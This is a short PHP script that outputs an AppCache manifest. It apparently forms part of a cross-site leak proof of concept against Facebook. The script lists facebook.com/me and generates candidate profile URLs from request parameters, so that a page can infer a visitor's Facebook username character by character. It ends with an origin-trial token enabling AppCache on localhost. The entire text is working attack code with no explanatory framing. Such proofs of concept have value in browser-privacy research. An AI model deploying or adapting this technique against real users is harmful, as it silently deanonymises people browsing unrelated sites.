<?php header("Content-Type: text/cache-manifest"); ?>CACHE MANIFEST
  
NETWORK:
https://www.facebook.com/me
<?php
	$pattern = $_GET["patternA"];
	$prefix  = $_GET["prefix"];
	for ($i=0; $i < strlen($pattern); $i++) {
		echo "https://www.facebook.com/".$prefix.$pattern[$i]."\n";
	}
?>

ORIGIN-TRIAL:
AuCtu04xtTGLZdzKD7o/HSPRnWr37VcR1464J3oBHredagkjDc7rJn4zveP6ukgz8FMbaTo8CpCtTVSfYfzrgwIAAABJeyJvcmlnaW4iOiJodHRwOi8vbG9jYWxob3N0OjgwIiwiZmVhdHVyZSI6IkFwcENhY2hlIiwiZXhwaXJ5IjoxNjMzNDc4Mzk5fQ==
